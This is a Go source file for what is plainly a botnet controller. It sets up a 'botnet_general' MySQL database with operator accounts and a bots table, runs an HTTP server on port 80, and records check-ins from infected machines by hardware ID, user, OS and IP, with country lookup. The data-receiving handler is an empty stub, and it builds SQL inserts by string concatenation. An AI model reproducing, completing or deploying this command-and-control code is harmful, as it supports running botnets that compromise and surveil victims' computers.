package main

import (
	&#34;bufio&#34;
	&#34;crypto/sha512&#34;
	&#34;database/sql&#34;
	&#34;encoding/json&#34;
	&#34;filter&#34;
	&#34;fmt&#34;
	_ &#34;github.com/go-sql-driver/mysql&#34;
	&#34;io&#34;
	&#34;io/ioutil&#34;
	&#34;log&#34;
	&#34;net/http&#34;
	&#34;os&#34;
	&#34;strings&#34;
)

func ReadInput() string {
	var i *bufio.Reader
	var s string
	i = bufio.NewReader(os.Stdin)
	s, _ = i.ReadString(&#39;\n&#39;)
	s = strings.Trim(s, &#34;\r\n&#34;)
	return s
}

func GetCountryCode(ip string) string {
	type Details struct {
		Ip, CountryCode, CountryName, RegionCode, RegionName, City, Zip, Lat, Long, Metro, AreaCode string
	}
	var holder Details
	var body string
	var bodyB []byte
	var e error
	var response *http.Response
	response, e = http.Get(&#34;http://freegeoip.net/json/&#34; &#43; ip)
	if e != nil {
		log.Println(e)
		return &#34;--&#34;
	}
	bodyB, e = ioutil.ReadAll(response.Body)
	response.Body.Close()
	if e != nil {
		log.Println(e)
		return &#34;--&#34;
	}
	body = string(bodyB)
	dec := json.NewDecoder(strings.NewReader(body))
	for {
		if e = dec.Decode(&amp;holder); e == io.EOF {
			break
		} else if e != nil {
			log.Println(e)
			return &#34;--&#34;
		}
		return string(holder.CountryCode)
	}
	return &#34;--&#34;
}

func StandardReq(w http.ResponseWriter, r *http.Request) {
	var hwid, user, os string = r.FormValue(&#34;hwid&#34;), r.FormValue(&#34;user&#34;), r.FormValue(&#34;os&#34;)
	fmt.Printf(&#34;---INCOMING REQUEST--\r\n\r\nhwid=&#34; &#43; hwid &#43; &#34;\r\nuser=&#34; &#43; user &#43; &#34;\r\nos=&#34; &#43; os &#43; &#34;\r\nIP=&#34; &#43; r.RemoteAddr &#43; &#34;\r\nCountryCode=&#34; &#43; GetCountryCode(r.RemoteAddr) &#43; &#34;\r\n\r\n&#34;)
}

func RecieveData(w http.ResponseWriter, r *http.Request) {
	return
}

func PrepareDB(db *sql.DB) {
	var e error
	var username, password string
	_, e = db.Exec(&#34;CREATE DATABASE `botnet_general`&#34;)
	if e != nil {
		log.Fatal(e)
	}
	_, e = db.Exec(&#34;CREATE TABLE `botnet_general`.`accounts`(`id` INT NOT NULL AUTO_INCREMENT,`username` VARCHAR(255),`password` VARCHAR(255),PRIMARY KEY(`id`))&#34;)
	if e != nil {
		log.Fatal(e)
	}
	fmt.Printf(&#34;Enter a primary username: &#34;)
	username = ReadInput()
	fmt.Printf(&#34;Enter a primary password: &#34;)
	password = ReadInput()
	hasher := sha512.New()
	hasher.Write([]byte(password))
	password = fmt.Sprintf(&#34;%x&#34;, string(hasher.Sum(nil)))
	filter.SQLInjection(&amp;username)
	_, e = db.Exec(&#34;INSERT INTO `botnet_general`.`accounts`(`username`,`password`) VALUES(&#39;&#34; &#43; username &#43; &#34;&#39;,&#39;&#34; &#43; password &#43; &#34;&#39;)&#34;)
	if e != nil {
		log.Fatal(e)
	}
	_, e = db.Exec(&#34;CREATE TABLE `botnet_general`.`bots`(`id` INT NOT NULL AUTO_INCREMENT,`hwid` VARCHAR(255),`username` VARCHAR(255),`os` VARCHAR(255),`root` VARCHAR(255),`ip` VARCHAR(255),`country` VARCHAR(255), PRIMARY KEY (`id`))&#34;)
	if e != nil {
		log.Fatal(e)
	}
	fmt.Println(&#34;Setup successful!&#34;)
	return
}

func ValidateLaunch() {
	login, e := ioutil.ReadFile(&#34;SQLLogin.txt&#34;)
	if e != nil {
		log.Fatal(e)
	}
	db, e := sql.Open(&#34;mysql&#34;, string(login)&#43;&#34;/&#34;)
	if e != nil {
		log.Fatal(e)
	}
	e = db.QueryRow(&#34;SELECT `SCHEMA_NAME` FROM `information_schema`.`SCHEMATA` WHERE `SCHEMA_NAME`=&#39;botnet_general&#39;&#34;).Scan(new(string))
	if e == sql.ErrNoRows {
		PrepareDB(db)
	} else if e != nil {
		log.Fatal(e)
	} else {
		return
	}
}

func main() {
	ValidateLaunch()
	log.Println(&#34;Botnet controller running on port 80&#34;)
	http.HandleFunc(&#34;/request/&#34;, StandardReq)
	http.HandleFunc(&#34;/recieve/&#34;, RecieveData)
	http.ListenAndServe(&#34;:80&#34;, nil)
}
